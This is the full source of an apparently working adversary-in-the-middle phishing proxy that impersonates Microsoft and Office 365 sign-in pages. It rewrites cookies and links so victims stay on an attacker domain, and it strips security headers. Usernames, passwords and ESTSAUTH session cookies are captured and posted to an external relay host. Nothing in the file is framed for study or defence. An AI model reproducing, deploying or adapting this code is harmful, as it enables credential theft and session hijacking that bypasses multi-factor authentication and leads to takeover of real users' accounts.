export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

// All domains that should be proxied
const PROXY_DOMAINS = [
  'login.microsoftonline.com',
  'login.live.com', 
  'account.live.com',
  'account.microsoft.com',
  'aadcdn.msauth.net',
  'www.office.com',
  'office.com',
  'microsoft365.com',
  'outlook.office.com'
];

// For detecting auth cookies
const AUTH_COOKIES = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie', 'esctx'];

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = `IP: ${ip}\nURL: ${cleanUrl}\n\n${cookieText}`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    await fetch(VERCEL_URL, { method: "POST", body: formData });
  } catch (e) {}
}

// ==================== URL PARSING WITH QUERY CLEANING ====================
function parseProxiedUrl(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const slashIndex = withoutPrefix.indexOf('/');
    
    let domain, path;
    
    if (slashIndex === -1) {
      domain = withoutPrefix;
      path = '/';
    } else {
      domain = withoutPrefix.substring(0, slashIndex);
      path = withoutPrefix.substring(slashIndex);
    }
    
    if (PROXY_DOMAINS.includes(domain)) {
      return { domain, path, isProxied: true };
    }
  }
  
  return { domain: null, path: pathname, isProxied: false };
}

function shouldProxyDomain(hostname) {
  return PROXY_DOMAINS.includes(hostname);
}

function cleanQueryString(search) {
  if (!search) return '';
  const params = new URLSearchParams(search);
  let modified = false;
  
  for (const key of Array.from(params.keys())) {
    if (key === 'path') {
      params.delete(key);
      modified = true;
    }
  }
  
  if (!modified) return search;
  const newSearch = params.toString();
  return newSearch ? '?' + newSearch : '';
}

// ==================== CRITICAL: BIDIRECTIONAL COOKIE REWRITING ====================

// Rewrite cookies from client (our domain) to upstream (Microsoft domain)
function rewriteRequestCookies(cookieHeader, targetDomain) {
  if (!cookieHeader) return null;
  
  let modifiedCookies = cookieHeader;
  
  // Replace our domain with the target domain in cookie values
  const ourDomainRegex = new RegExp(YOUR_DOMAIN.replace(/\./g, '\\.'), 'g');
  modifiedCookies = modifiedCookies.replace(ourDomainRegex, targetDomain);
  
  // Also handle cookies with leading dot
  const ourDomainDotRegex = new RegExp('\\.' + YOUR_DOMAIN.replace(/\./g, '\\.'), 'g');
  modifiedCookies = modifiedCookies.replace(ourDomainDotRegex, '.' + targetDomain);
  
  return modifiedCookies;
}

// Rewrite cookies from upstream (Microsoft) to client (our domain)
function rewriteResponseCookies(cookies, targetDomain) {
  const modifiedCookies = [];
  
  for (const cookie of cookies) {
    if (!cookie) continue;
    let modifiedCookie = cookie;
    
    // Replace target domain with our domain
    modifiedCookie = modifiedCookie.replace(
      new RegExp(targetDomain.replace(/\./g, '\\.'), 'g'),
      YOUR_DOMAIN
    );
    
    // Also handle cookies with leading dot
    modifiedCookie = modifiedCookie.replace(
      new RegExp('\\.' + targetDomain.replace(/\./g, '\\.'), 'g'),
      '.' + YOUR_DOMAIN
    );
    
    modifiedCookies.push(modifiedCookie);
  }
  
  return modifiedCookies;
}

function rewriteLocation(location, currentDomain) {
  if (!location) return location;
  
  try {
    if (location.startsWith('/')) {
      const qIndex = location.indexOf('?');
      if (qIndex !== -1) {
        const pathPart = location.substring(0, qIndex);
        const queryPart = location.substring(qIndex);
        const cleanedQuery = cleanQueryString(queryPart);
        location = pathPart + cleanedQuery;
      }
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${currentDomain}${location}`;
    }
    
    const url = new URL(location);
    
    if (shouldProxyDomain(url.hostname)) {
      const cleanSearch = cleanQueryString(url.search);
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${cleanSearch}${url.hash}`;
    }
    
    return location;
  } catch (e) {
    return location;
  }
}

function parseCredentials(bodyText) {
  let user = null, pass = null;
  if (!bodyText) return { user, pass };
  
  try {
    const params = new URLSearchParams(bodyText);
    user = params.get('login') || params.get('loginfmt') || params.get('username') || params.get('Email');
    pass = params.get('passwd') || params.get('password') || params.get('Password');
    
    if (user && pass) {
      user = decodeURIComponent(user.replace(/\+/g, ' '));
      pass = decodeURIComponent(pass.replace(/\+/g, ' '));
    }
  } catch (e) {}
  
  return { user, pass };
}

function hasAuthCookies(cookieStr) {
  if (!cookieStr) return false;
  const lower = cookieStr.toLowerCase();
  return AUTH_COOKIES.some(cookie => lower.includes(cookie.toLowerCase()));
}

// ==================== MAIN HANDLER ====================

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const { domain: targetDomain, path: targetPath, isProxied } = parseProxiedUrl(url.pathname);
  
  // Handle non-proxied requests
  if (!isProxied || !targetDomain) {
    const redirectUrl = `https://${YOUR_DOMAIN}${PROXY_PREFIX}www.office.com/login`;
    console.log(`[REDIRECT] Root -> ${redirectUrl}`);
    return new Response(null, {
      status: 302,
      headers: {
        'Location': redirectUrl,
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Credentials': 'true'
      }
    });
  }

  const cleanSearch = cleanQueryString(url.search);
  const upstreamUrl = `https://${targetDomain}${targetPath}${cleanSearch}`;
  
  console.log(`[PROXY] ${request.method} ${url.pathname} -> ${upstreamUrl}`);

  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Cookie, Set-Cookie, Authorization',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  // Build request headers
  const headers = new Headers();
  
  const headersToCopy = ['user-agent', 'accept', 'accept-language', 'accept-encoding', 'content-type', 'referer', 'origin', 'authorization'];
  for (const h of headersToCopy) {
    const val = request.headers.get(h);
    if (val) headers.set(h, val);
  }
  
  // CRITICAL: Rewrite cookies from client domain to upstream domain
  const clientCookies = request.headers.get('cookie');
  if (clientCookies) {
    const rewrittenCookies = rewriteRequestCookies(clientCookies, targetDomain);
    if (rewrittenCookies) {
      headers.set('cookie', rewrittenCookies);
      console.log(`[COOKIES] Rewrote request cookies for ${targetDomain}`);
    }
  }
  
  headers.set('Host', targetDomain);
  
  if (!headers.has('referer')) {
    headers.set('Referer', `https://${targetDomain}/`);
  }
  
  headers.delete('content-length');
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');
  headers.delete('x-forwarded-for');

  let requestBody = null;

  // Handle POST requests for credentials
  if (request.method === 'POST') {
    try {
      const cloned = request.clone();
      const bodyText = await cloned.text();
      const { user, pass } = parseCredentials(bodyText);
      
      if (user && pass) {
        console.log(`[CREDS] Captured: ${user}`);
        await sendToVercel('credentials', { ip, user, pass, url: url.href });
        
        const formData = new FormData();
        formData.append("file", new Blob([`IP: ${ip}\nUser: ${user}\nPass: ${pass}\nURL: ${url.href}`], { type: "text/plain" }), `${ip}-CREDENTIALS.txt`);
        await fetch(VERCEL_URL, { method: "POST", body: formData });
      }
      
      requestBody = bodyText;
    } catch (err) {
      requestBody = request.body;
    }
  }

  try {
    const response = await fetch(upstreamUrl, {
      method: request.method,
      headers: headers,
      body: requestBody,
      redirect: 'manual'
    });
    
    // Handle redirects
    if (response.status >= 300 && response.status < 400 && response.headers.has('Location')) {
      const location = response.headers.get('Location');
      const rewrittenLocation = rewriteLocation(location, targetDomain);
      console.log(`[REDIRECT] ${response.status} -> ${rewrittenLocation}`);
      
      const redirectHeaders = new Headers();
      redirectHeaders.set('Location', rewrittenLocation);
      redirectHeaders.set('Access-Control-Allow-Origin', '*');
      redirectHeaders.set('Access-Control-Allow-Credentials', 'true');
      
      return new Response(null, {
        status: response.status,
        headers: redirectHeaders
      });
    }
    
    // Build response headers
    const responseHeaders = new Headers();
    
    const headersToCopyResponse = ['content-type', 'cache-control', 'expires', 'etag', 'last-modified', 'vary'];
    for (const h of headersToCopyResponse) {
      const val = response.headers.get(h);
      if (val) responseHeaders.set(h, val);
    }
    
    responseHeaders.delete('content-security-policy');
    responseHeaders.delete('content-security-policy-report-only');
    responseHeaders.delete('clear-site-data');
    responseHeaders.delete('strict-transport-security');
    
    responseHeaders.set('Access-Control-Allow-Origin', '*');
    responseHeaders.set('Access-Control-Allow-Credentials', 'true');
    
    // Process cookies - CRITICAL: Rewrite from upstream domain to client domain
    const cookies = response.headers.getSetCookie?.() || [];
    let cookieStr = '';
    
    if (cookies.length) {
      cookieStr = cookies.join('; ');
      const hasAuth = hasAuthCookies(cookieStr);
      
      if (hasAuth) {
        console.log(`[AUTH COOKIES] Found auth cookies from ${targetDomain}`);
        await exfiltrateCookies(cookieStr, ip, url.href);
      }
      
      // Rewrite cookies for the client
      const rewrittenCookies = rewriteResponseCookies(cookies, targetDomain);
      for (const cookie of rewrittenCookies) {
        responseHeaders.append('Set-Cookie', cookie);
      }
      console.log(`[COOKIES] Rewrote ${rewrittenCookies.length} response cookies for client`);
    }
    
    // Process response body
    const contentType = response.headers.get('content-type') || '';
    
    if (contentType.includes('text/html') || 
        contentType.includes('javascript') || 
        contentType.includes('json') || 
        contentType.includes('css')) {
      
      let text = await response.text();
      
      // Replace all proxy domains with our proxied URLs
      for (const domain of PROXY_DOMAINS) {
        const regex = new RegExp(`https?://${domain.replace(/\./g, '\\.')}`, 'g');
        text = text.replace(regex, `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`);
      }
      
      // Fix relative URLs
      text = text.replace(/(src|href)="\/(?!_p\/)/g, `$1="https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      text = text.replace(/(src|href)='\/(?!_p\/)/g, `$1='https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      
      text = text.replace(/action="\/(?!_p\/)/g, `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      text = text.replace(/action='\/(?!_p\/)/g, `action='https://${YOUR_DOMAIN}${PROXY_PREFIX}${targetDomain}/`);
      
      return new Response(text, {
        status: response.status,
        headers: responseHeaders
      });
    }
    
    return new Response(response.body, {
      status: response.status,
      headers: responseHeaders
    });
    
  } catch (err) {
    console.error(`[ERROR] ${err.message}`);
    return new Response(
      JSON.stringify({ error: 'Proxy Error', message: err.message }),
      { status: 502, headers: { 'Content-Type': 'application/json' } }
    );
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
